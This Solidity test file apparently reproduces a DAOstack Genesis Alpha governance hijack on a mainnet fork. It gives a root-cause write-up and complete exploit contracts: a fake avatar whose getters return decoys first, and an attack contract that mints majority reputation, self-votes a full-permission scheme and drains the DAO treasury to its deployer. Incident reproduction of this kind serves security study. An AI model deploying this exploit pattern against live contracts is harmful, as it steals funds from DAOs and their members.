// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "../basetest.sol";

// DAOstack Genesis Alpha - governance hijack via permissionless UController.newOrganization.
// Ethereum mainnet, 2026-09.
//
// Attack tx : 0xcfff7b060a7fb881f4bd8d2498dbe4e09454f7afaf5328fc12b59812f6737cc1
// Block     : 26059090  (fork at parent 26059089)
// Attacker  : EOA 0x5cF6bf4197c13b9C0Ae4AECC6Eb10Ef61bC6bEB0. The tx `to` is EMPTY, so this is a
//             CONTRACT-CREATION transaction: the attacker's factory (0xa90BBd7f...) ran the whole
//             attack from its constructor, which deployed a logic contract (0x304A8E57...) and
//             called run() on it. This PoC reconstructs that logic contract as DAOstackExploit.
//
// Contracts (Ethereum, chainid 1) - NONE are verified on Etherscan, so every call below uses the
// exact 4-byte selector recovered from the attack trace with real typed arguments. This is a
// structural reconstruction from decoded values, not a raw-calldata blob or a bytecode replay.
//   UController (shared DAOstack controller, owns the Reputation) : 0xD5bEe5D9Ae589094c51e533f35656963fdA87305
//   Genesis Alpha DAO Avatar / treasury (victim)                  : 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0
//   Reputation (voting weight, Ownable by the UController)        : 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
//   Native token GDT (Ownable by the UController)                 : 0xe30a71938b743d126E977A2b3F7450484F209a34
//   SchemeRegistrar                                               : 0x781f48F300f9c2f4862347537927FC9Dc48415E0
//   GenesisProtocol voting machine                                : 0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba
//
// Selectors verified with `cast sig` against the trace-decoded calls:
//   newOrganization(address)                       0xb9981364   (UController)
//   mintReputation(uint256,address,address)        0xeaf994b2   (UController)
//   sendEther(uint256,address,address)             0x634965da   (UController)
//   proposeScheme(address,address,bytes32,bytes4)  0x1c940d51   (SchemeRegistrar)
//   vote(bytes32,uint256)                          0x9ef1204c   (GenesisProtocol)
//
// ROOT CAUSE (confirmed empirically against the fork and the on-chain trace, since source is
// unverified):
//   The DAO's Reputation contract is Ownable by the SHARED UController (verified on fork:
//   Reputation.owner() == UController, and Avatar.owner() == UController). UController.newOrganization
//   is permissionless - it takes a caller-supplied avatar, reads that avatar's own
//   nativeReputation()/nativeToken(), stores them as the new org, and registers msg.sender as a
//   full-permission (0x1F) scheme over that org. It NEVER checks that the reputation is already
//   governed by another organization. Proof it is unguarded: in the trace, msg.sender was the
//   attacker's brand-new contract with no prior relationship to the DAO, and the call succeeded
//   (see testNewOrganizationIsPermissionless below, which re-derives this from a fresh unrelated
//   address on the live fork).
//
//   So the attacker registered a fake avatar that reports the VICTIM's real Reputation as its own,
//   became a mint-authorized scheme over it, and had the UController (the Reputation's owner) mint
//   reputation to the attacker. With majority reputation the attacker used SchemeRegistrar's
//   propose/self-vote/execute flow to install itself as a 0x1F scheme on the REAL avatar, then
//   called sendEther to drain the treasury.
//
// THE FAKE AVATAR IS A SHAPE-SHIFTER (mirrors the on-chain helper 0xD9902ea5... exactly). In the
// trace its getters return a freshly-deployed decoy on the FIRST read of each and the victim's REAL
// contracts on every read after that:
//   nativeReputation():  call #1 -> decoy 0x7f7d02dd... , calls #2+ -> real 0x6256294145fb...
//   nativeToken():       call #1 -> decoy 0x20aef079... , calls #2+ -> real 0xe30a71938b...
//   owner():             -> UController
// newOrganization reads each getter several times; the read it uses for storage returns the real
// reputation, so the registered org points at the victim's real Reputation (confirmed: the later
// mintReputation minted on 0x6256294145fb...). This PoC reproduces that exact per-getter fake-first
// behaviour; it does not need to know which internal read fed which check, because the real
// UController on the fork responds identically to the identical getter behaviour.
//
// FLOW / NUMBERS (from the trace and confirmed on the fork at block 26059089):
//   Reputation.totalSupply before : 9,738.627137e18
//   mintReputation minted         : 20,000e18 to the attacker scheme   -> supply 29,738.627137e18
//   GenesisProtocol burns          : 200e18 from the attacker as vote cost -> net attacker 19,800e18,
//                                    supply 29,538.627137e18 (matches the reported 19,800 / 29,538)
//   Avatar ETH balance at fork    : exactly 4.025 ETH
//   sendEther drains              : 4.025 ETH (the full treasury balance)

interface IUController {
    function newOrganization(address _avatar) external;
    function mintReputation(uint256 _amount, address _to, address _avatar) external returns (bool);
    function sendEther(uint256 _amountInWei, address _to, address _avatar) external returns (bool);
}

interface ISchemeRegistrar {
    function proposeScheme(
        address _avatar,
        address _scheme,
        bytes32 _parametersHash,
        bytes4 _permissions
    ) external returns (bytes32);
}

interface IGenesisProtocol {
    function vote(bytes32 _proposalId, uint256 _vote) external returns (bool);
}

interface IReputation {
    function totalSupply() external view returns (uint256);
    function reputationOf(address _owner) external view returns (uint256);
}

// A do-nothing contract with nonzero code size, used as the first-read decoy for the fake avatar's
// getters (the on-chain helper deployed 57-byte stubs for this; newOrganization only ever reads
// them as addresses, never calls into them).
contract Stub {}

// Reconstruction of the attacker's fake avatar (on-chain 0xD9902ea5...). Reports the victim's real
// Reputation/token as its own, but returns a decoy on the first read of each getter, exactly as the
// trace shows.
contract FakeAvatar {
    address public immutable controller; // returned by owner()
    address public immutable realReputation;
    address public immutable realToken;
    address public immutable decoyReputation;
    address public immutable decoyToken;

    uint256 private repReads;
    uint256 private tokenReads;

    constructor(address _controller, address _realReputation, address _realToken) {
        controller = _controller;
        realReputation = _realReputation;
        realToken = _realToken;
        decoyReputation = address(new Stub());
        decoyToken = address(new Stub());
    }

    function owner() external view returns (address) {
        return controller;
    }

    function nativeReputation() external returns (address) {
        repReads += 1;
        return repReads == 1 ? decoyReputation : realReputation;
    }

    function nativeToken() external returns (address) {
        tokenReads += 1;
        return tokenReads == 1 ? decoyToken : realToken;
    }
}

// Reconstruction of the attacker's logic/scheme contract (on-chain 0x304A8E57...). It is the
// msg.sender to newOrganization, the scheme installed with 0x1F permissions, the reputation holder
// that votes, and the recipient of the drained ETH. It forwards the proceeds to its deployer.
contract DAOstackExploit {
    IUController constant UCONTROLLER = IUController(0xD5bEe5D9Ae589094c51e533f35656963fdA87305);
    ISchemeRegistrar constant SCHEME_REGISTRAR = ISchemeRegistrar(0x781f48F300f9c2f4862347537927FC9Dc48415E0);
    IGenesisProtocol constant VOTING_MACHINE = IGenesisProtocol(0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba);

    address constant VICTIM_AVATAR = 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0;
    address constant REAL_REPUTATION = 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9;
    address constant REAL_TOKEN = 0xe30a71938b743d126E977A2b3F7450484F209a34;

    uint256 constant MINT_AMOUNT = 20_000e18; // gives the attacker a >66% majority of reputation
    uint256 constant DRAIN_AMOUNT = 4.025 ether; // the avatar's full ETH balance at the fork block

    address immutable beneficiary;

    constructor() {
        beneficiary = msg.sender;
    }

    function run() external {
        // 1. Deploy the shape-shifting fake avatar that reports the victim's real Reputation/token.
        FakeAvatar fakeAvatar = new FakeAvatar(address(UCONTROLLER), REAL_REPUTATION, REAL_TOKEN);

        // 2. Register as a full-permission scheme over an org that points at the real Reputation.
        //    Permissionless: this contract has no prior relationship to the DAO.
        UCONTROLLER.newOrganization(address(fakeAvatar));

        // 3. The UController owns the real Reputation, so as a mint-authorized scheme we mint a
        //    majority stake to ourselves on the VICTIM's real Reputation.
        require(UCONTROLLER.mintReputation(MINT_AMOUNT, address(this), address(fakeAvatar)), "mint failed");

        // 4. Propose installing ourselves as a 0x1F (all-permissions) scheme on the REAL avatar,
        //    then self-vote YES. Our fresh majority passes and executes it in one shot.
        bytes32 proposalId =
            SCHEME_REGISTRAR.proposeScheme(VICTIM_AVATAR, address(this), bytes32(0), bytes4(0x0000001f));
        require(VOTING_MACHINE.vote(proposalId, 1), "vote failed");

        // 5. Now a full-permission scheme on the real avatar: drain its ETH treasury to ourselves.
        require(UCONTROLLER.sendEther(DRAIN_AMOUNT, address(this), VICTIM_AVATAR), "sendEther failed");

        // Forward the proceeds to the deployer (the attacker EOA in the real incident).
        (bool ok,) = beneficiary.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {}
}

contract DAOstackExploitTest is BaseTestWithBalanceLog {
    IReputation constant REPUTATION = IReputation(0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9);
    IUController constant UCONTROLLER = IUController(0xD5bEe5D9Ae589094c51e533f35656963fdA87305);
    address constant VICTIM_AVATAR = 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0;
    address constant REAL_TOKEN = 0xe30a71938b743d126E977A2b3F7450484F209a34;

    function setUp() public {
        vm.createSelectFork("mainnet", 26_059_089); // parent of the attack block 26059090
        fundingToken = address(0); // profit is native ETH
    }

    receive() external payable {}

    function testExploit() public balanceLog {
        uint256 supplyBefore = REPUTATION.totalSupply();
        uint256 avatarEthBefore = VICTIM_AVATAR.balance;
        assertEq(avatarEthBefore, 4.025 ether, "avatar treasury precondition");

        DAOstackExploit exploit = new DAOstackExploit();
        exploit.run();

        // The attacker minted a majority stake on the DAO's real Reputation.
        uint256 supplyAfter = REPUTATION.totalSupply();
        assertEq(supplyAfter - supplyBefore, 20_000e18 - 200e18, "net reputation minted (mint 20000 - 200 vote cost)");

        // Treasury drained: the avatar's ETH is gone and it landed with the attacker (this test).
        assertEq(VICTIM_AVATAR.balance, 0, "avatar drained");
        assertApproxEqAbs(address(this).balance, 4.025 ether, 1e15, "reproduced drain approximates 4.025 ETH");
    }

    // Confirms the CONFIRM item: newOrganization is genuinely permissionless and has no guard tying
    // a Reputation to a single controlling organization. From a fresh, unrelated address we register
    // a new org over the SAME real Reputation and mint to ourselves - which must be impossible if any
    // access control or reputation-uniqueness check existed.
    function testNewOrganizationIsPermissionless() public {
        address stranger = makeAddr("stranger");
        uint256 before = REPUTATION.reputationOf(stranger);
        assertEq(before, 0, "stranger starts with no reputation");

        vm.startPrank(stranger);
        FakeAvatar fakeAvatar = new FakeAvatar(
            address(UCONTROLLER), 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9, REAL_TOKEN
        );
        UCONTROLLER.newOrganization(address(fakeAvatar)); // no revert -> no access control
        bool ok = UCONTROLLER.mintReputation(1234e18, stranger, address(fakeAvatar));
        vm.stopPrank();

        assertTrue(ok, "mint on the victim's reputation succeeded for an arbitrary caller");
        assertEq(
            REPUTATION.reputationOf(stranger) - before,
            1234e18,
            "arbitrary caller minted on a reputation it never owned - no uniqueness guard"
        );
    }
}
